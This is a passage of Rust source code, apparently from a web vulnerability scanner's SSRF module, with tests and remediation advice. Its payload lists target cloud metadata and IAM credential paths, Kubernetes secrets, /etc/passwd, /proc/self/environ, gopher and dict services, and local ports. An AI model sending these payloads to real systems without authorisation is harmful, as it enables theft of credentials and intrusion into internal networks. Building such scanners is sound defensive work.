            ("file:///proc/self/environ", "File /proc/self/environ"),
            ("gopher://127.0.0.1:6379/_INFO", "Gopher Redis"),
            ("dict://127.0.0.1:11211/stats", "Dict Memcached"),
        ];

        for (url, desc) in protocol_essential {
            payloads.push(SsrfPayload {
                payload: url.to_string(),
                category: SsrfBypassCategory::ProtocolSmuggling,
                description: desc.to_string(),
                severity: Severity::Critical,
            });
        }

        // Common ports
        let port_essential = vec![
            ("http://127.0.0.1:22/", "SSH port 22"),
            ("http://127.0.0.1:3306/", "MySQL port 3306"),
            ("http://127.0.0.1:5432/", "PostgreSQL port 5432"),
            ("http://127.0.0.1:6379/", "Redis port 6379"),
            ("http://127.0.0.1:27017/", "MongoDB port 27017"),
            ("http://127.0.0.1:9200/", "Elasticsearch port 9200"),
            ("http://127.0.0.1:8080/", "HTTP alt port 8080"),
        ];

        for (url, desc) in port_essential {
            payloads.push(SsrfPayload {
                payload: url.to_string(),
                category: SsrfBypassCategory::PortScan,
                description: desc.to_string(),
                severity: Severity::Medium,
            });
        }

        // Kubernetes - Essential
        let k8s_essential = vec![
            ("http://kubernetes.default.svc/api/v1/namespaces/default/secrets", "K8s secrets"),
            ("http://kubernetes.default.svc/api/v1/namespaces/default/pods", "K8s pods"),
        ];

        for (url, desc) in k8s_essential {
            payloads.push(SsrfPayload {
                payload: url.to_string(),
                category: SsrfBypassCategory::ContainerMetadata,
                description: desc.to_string(),
                severity: Severity::Critical,
            });
        }

        payloads
    }

    /// Generate basic SSRF payloads (free tier)
    fn generate_basic_payloads(&self) -> Vec<SsrfPayload> {
        vec![
            SsrfPayload {
                payload: "http://169.254.169.254/latest/meta-data/".to_string(),
                category: SsrfBypassCategory::CloudMetadata,
                description: "AWS metadata".to_string(),
                severity: Severity::Critical,
            },
            SsrfPayload {
                payload: "http://localhost/".to_string(),
                category: SsrfBypassCategory::LocalhostBypass,
                description: "Localhost".to_string(),
                severity: Severity::High,
            },
            SsrfPayload {
                payload: "http://127.0.0.1/".to_string(),
                category: SsrfBypassCategory::LocalhostBypass,
                description: "127.0.0.1".to_string(),
                severity: Severity::High,
            },
            SsrfPayload {
                payload: "file:///etc/passwd".to_string(),
                category: SsrfBypassCategory::ProtocolSmuggling,
                description: "File /etc/passwd".to_string(),
                severity: Severity::Critical,
            },
        ]
    }

    /// Analyze HTTP response for SSRF indicators
    fn analyze_ssrf_response(
        &self,
        response: &HttpResponse,
        ssrf_payload: &SsrfPayload,
        parameter: &str,
        test_url: &str,
        baseline: &HttpResponse,
    ) -> Option<Vulnerability> {
        let body_lower = response.body.to_lowercase();
        let baseline_lower = baseline.body.to_lowercase();

        // Critical: Check if response is significantly different from baseline
        let response_changed = response.body != baseline.body;
        let size_diff = (response.body.len() as i64 - baseline.body.len() as i64).abs();
        let significant_change = size_diff > 50 || response.status_code != baseline.status_code;

        // AWS Metadata indicators
        let aws_indicators = [
            "ami-id", "instance-id", "placement/availability-zone",
            "iam/security-credentials", "accesskeyid", "secretaccesskey",
            "iam-info", "public-ipv4", "local-ipv4", "public-hostname",
            "instance-type", "security-groups", "meta-data",
            "dynamic/instance-identity",
        ];

        // GCP Metadata indicators
        let gcp_indicators = [
            "computemetadata/v1", "service-accounts/default", "project-id",
            "instance/zone", "instance/machine-type", "instance/network-interfaces",
            "attributes/",
        ];

        // Azure Metadata indicators
        let azure_indicators = [
            "subscriptionid", "resourcegroupname", "vmid", "vmsize",
            "vmscalesetname", "platformfaultdomain", "azureenvironment",
        ];

        // Internal service indicators
        let internal_indicators = [
            "root:x:", "ssh-", "redis_version", "elasticsearch",
            "mongodb", "[mail]", "environment", "mysql",
            "postgresql", "memcached", "nginx",
        ];

        // Check for AWS metadata
        for indicator in &aws_indicators {
            if body_lower.contains(indicator) && !baseline_lower.contains(indicator) {
                if response_changed || significant_change {
                    return Some(self.create_vulnerability(
                        parameter,
                        &ssrf_payload.payload,
                        test_url,
                        &format!("AWS EC2 Metadata Service accessible via {} bypass - credentials may be exposed", ssrf_payload.category.as_str()),
                        Confidence::High,
                        format!("AWS metadata indicator: {}", indicator),
                        &ssrf_payload.category,
                    ));
                }
            }
        }

        // Check for GCP metadata
        for indicator in &gcp_indicators {
            if body_lower.contains(indicator) && !baseline_lower.contains(indicator) {
                if response_changed || significant_change {
                    return Some(self.create_vulnerability(
                        parameter,
                        &ssrf_payload.payload,
                        test_url,
                        &format!("GCP Metadata Service accessible via {} bypass - credentials may be exposed", ssrf_payload.category.as_str()),
                        Confidence::High,
                        format!("GCP metadata indicator: {}", indicator),
                        &ssrf_payload.category,
                    ));
                }
            }
        }

        // Check for Azure metadata
        for indicator in &azure_indicators {
            if body_lower.contains(indicator) && !baseline_lower.contains(indicator) {
                if response_changed || significant_change {
                    return Some(self.create_vulnerability(
                        parameter,
                        &ssrf_payload.payload,
                        test_url,
                        &format!("Azure Metadata Service accessible via {} bypass - instance information exposed", ssrf_payload.category.as_str()),
                        Confidence::High,
                        format!("Azure metadata indicator: {}", indicator),
                        &ssrf_payload.category,
                    ));
                }
            }
        }

        // Check for internal service responses
        for indicator in &internal_indicators {
            if body_lower.contains(indicator) && !baseline_lower.contains(indicator) {
                if response_changed || significant_change {
                    return Some(self.create_vulnerability(
                        parameter,
                        &ssrf_payload.payload,
                        test_url,
                        &format!("Internal service accessible via {} bypass - network segmentation bypass", ssrf_payload.category.as_str()),
                        Confidence::High,
                        format!("Internal service indicator: {}", indicator),
                        &ssrf_payload.category,
                    ));
                }
            }
        }

        None
    }

    /// Create a vulnerability record
    fn create_vulnerability(
        &self,
        parameter: &str,
        payload: &str,
        test_url: &str,
        description: &str,
        confidence: Confidence,
        evidence: String,
        category: &SsrfBypassCategory,
    ) -> Vulnerability {
        Vulnerability {
            id: format!("ssrf_{}", uuid::Uuid::new_v4().to_string()),
            vuln_type: format!("Server-Side Request Forgery (SSRF) - {}", category.as_str()),
            severity: Severity::Critical,
            confidence,
            category: "SSRF".to_string(),
            url: test_url.to_string(),
            parameter: Some(parameter.to_string()),
            payload: payload.to_string(),
            description: format!(
                "SSRF vulnerability detected in parameter '{}'. {}. Bypass category: {}",
                parameter, description, category.as_str()
            ),
            evidence: Some(evidence),
            cwe: "CWE-918".to_string(),
            cvss: 9.1,
            verified: true,
            false_positive: false,
            remediation: r#"IMMEDIATE ACTION REQUIRED:

1. **Input Validation**
   - Validate and sanitize all URLs from user input
   - Use strict allowlists for permitted domains/IPs (NOT denylists)
   - Block all private IP ranges (10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16)
   - Block link-local addresses (169.254.0.0/16)
   - Block localhost variations (127.0.0.0/8, ::1)

2. **Protocol Restrictions**
   - Disable unnecessary URL schemes (file://, gopher://, dict://, ldap://, ftp://)
   - Only allow http:// and https:// if external URLs are required
   - Validate URL scheme before making requests

3. **Cloud Metadata Protection**
   - Use IMDSv2 (requires session tokens) on AWS
   - Block access to metadata endpoints at firewall level
   - Use network policies to restrict outbound connections
   - Configure VPC endpoints for cloud services

4. **DNS Protection**
   - Resolve DNS before validation, then validate the IP
   - Implement DNS rebinding protection
   - Use a dedicated DNS resolver with rebinding protection
   - Cache DNS resolutions to prevent TOCTOU attacks

5. **Network Segmentation**
   - Implement proper network segmentation
   - Use egress filtering to limit outbound connections
   - Deploy the application in a restricted network zone
   - Use a proxy service for all outbound HTTP requests

6. **Request Restrictions**
   - Disable HTTP redirects or limit redirect count
   - Set strict timeouts for external requests
   - Limit response size to prevent DoS
   - Validate Content-Type of responses

7. **Monitoring and Detection**
   - Log all outbound requests with full URLs
   - Alert on requests to private IP ranges
   - Monitor for unusual outbound traffic patterns
   - Implement request rate limiting

8. **Defense in Depth**
   - Use a Web Application Firewall (WAF) with SSRF protection
   - Implement SSRF detection at multiple layers
   - Regular security testing for SSRF vulnerabilities
   - Keep all libraries and frameworks updated

References:
- OWASP SSRF: https://owasp.org/www-community/attacks/Server_Side_Request_Forgery
- CWE-918: https://cwe.mitre.org/data/definitions/918.html
- AWS IMDSv2: https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/configuring-instance-metadata-service.html
- PortSwigger SSRF: https://portswigger.net/web-security/ssrf"#.to_string(),
            discovered_at: chrono::Utc::now().to_rfc3339(),
        }
    }
}

// UUID generation helper
mod uuid {
    use rand::Rng;

    pub struct Uuid;

    impl Uuid {
        pub fn new_v4() -> Self {
            Self
        }

        pub fn to_string(&self) -> String {
            let mut rng = rand::rng();
            format!(
                "{:08x}-{:04x}-{:04x}-{:04x}-{:012x}",
                rng.random::<u32>(),
                rng.random::<u16>(),
                rng.random::<u16>(),
                rng.random::<u16>(),
                rng.random::<u64>() & 0xffffffffffff
            )
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[tokio::test]
    async fn test_ssrf_payload_count() {
        let scanner = SsrfScanner::new(Arc::new(HttpClient::new(5, 2).unwrap()));
        let payloads = scanner.generate_enterprise_payloads();

        // Should have 200+ enterprise-grade payloads
        assert!(payloads.len() >= 200, "Should have at least 200 SSRF payloads, got {}", payloads.len());
    }

    #[tokio::test]
    async fn test_ssrf_categories() {
        let scanner = SsrfScanner::new(Arc::new(HttpClient::new(5, 2).unwrap()));
        let payloads = scanner.generate_enterprise_payloads();

        // Check all bypass categories are represented
        let categories: Vec<_> = payloads.iter().map(|p| &p.category).collect();

        assert!(categories.iter().any(|c| **c == SsrfBypassCategory::CloudMetadata), "Missing CloudMetadata");
        assert!(categories.iter().any(|c| **c == SsrfBypassCategory::LocalhostBypass), "Missing LocalhostBypass");
        assert!(categories.iter().any(|c| **c == SsrfBypassCategory::InternalNetwork), "Missing InternalNetwork");
        assert!(categories.iter().any(|c| **c == SsrfBypassCategory::ProtocolSmuggling), "Missing ProtocolSmuggling");
        assert!(categories.iter().any(|c| **c == SsrfBypassCategory::UrlParserDifferential), "Missing UrlParserDifferential");
        assert!(categories.iter().any(|c| **c == SsrfBypassCategory::ContainerMetadata), "Missing ContainerMetadata");
        assert!(categories.iter().any(|c| **c == SsrfBypassCategory::DnsRebinding), "Missing DnsRebinding");
        assert!(categories.iter().any(|c| **c == SsrfBypassCategory::WhitelistBypass), "Missing WhitelistBypass");
        assert!(categories.iter().any(|c| **c == SsrfBypassCategory::PortScan), "Missing PortScan");
    }

    #[tokio::test]
    async fn test_aws_metadata_payloads() {
        let scanner = SsrfScanner::new(Arc::new(HttpClient::new(5, 2).unwrap()));
        let payloads = scanner.generate_enterprise_payloads();

        // Check for critical AWS payloads
        assert!(payloads.iter().any(|p| p.payload.contains("169.254.169.254")), "Missing AWS metadata IP");
        assert!(payloads.iter().any(|p| p.payload.contains("0xA9FEA9FE")), "Missing AWS metadata hex IP");
        assert!(payloads.iter().any(|p| p.payload.contains("2852039166")), "Missing AWS metadata decimal IP");
        assert!(payloads.iter().any(|p| p.payload.contains("iam/security-credentials")), "Missing IAM credentials path");
    }

    #[tokio::test]
    async fn test_localhost_bypass_payloads() {
        let scanner = SsrfScanner::new(Arc::new(HttpClient::new(5, 2).unwrap()));
        let payloads = scanner.generate_enterprise_payloads();

        // Check for various localhost representations
        assert!(payloads.iter().any(|p| p.payload.contains("127.0.0.1")), "Missing standard localhost");
        assert!(payloads.iter().any(|p| p.payload.contains("127.1")), "Missing shortened localhost");
        assert!(payloads.iter().any(|p| p.payload.contains("2130706433")), "Missing decimal localhost");
        assert!(payloads.iter().any(|p| p.payload.contains("0x7f000001")), "Missing hex localhost");
        assert!(payloads.iter().any(|p| p.payload.contains("0177.0.0.1")), "Missing octal localhost");
        assert!(payloads.iter().any(|p| p.payload.contains("[::1]")), "Missing IPv6 localhost");
    }

    #[tokio::test]
    async fn test_protocol_smuggling_payloads() {
        let scanner = SsrfScanner::new(Arc::new(HttpClient::new(5, 2).unwrap()));
        let payloads = scanner.generate_enterprise_payloads();

        // Check for protocol payloads
        assert!(payloads.iter().any(|p| p.payload.starts_with("file://")), "Missing file:// protocol");
        assert!(payloads.iter().any(|p| p.payload.starts_with("gopher://")), "Missing gopher:// protocol");
        assert!(payloads.iter().any(|p| p.payload.starts_with("dict://")), "Missing dict:// protocol");
        assert!(payloads.iter().any(|p| p.payload.starts_with("ldap://")), "Missing ldap:// protocol");
    }

    #[test]
    fn test_bypass_category_names() {
        assert_eq!(SsrfBypassCategory::CloudMetadata.as_str(), "Cloud Metadata");
        assert_eq!(SsrfBypassCategory::IpObfuscation.as_str(), "IP Obfuscation");
        assert_eq!(SsrfBypassCategory::DnsRebinding.as_str(), "DNS Rebinding");
        assert_eq!(SsrfBypassCategory::ProtocolSmuggling.as_str(), "Protocol Smuggling");
    }
}
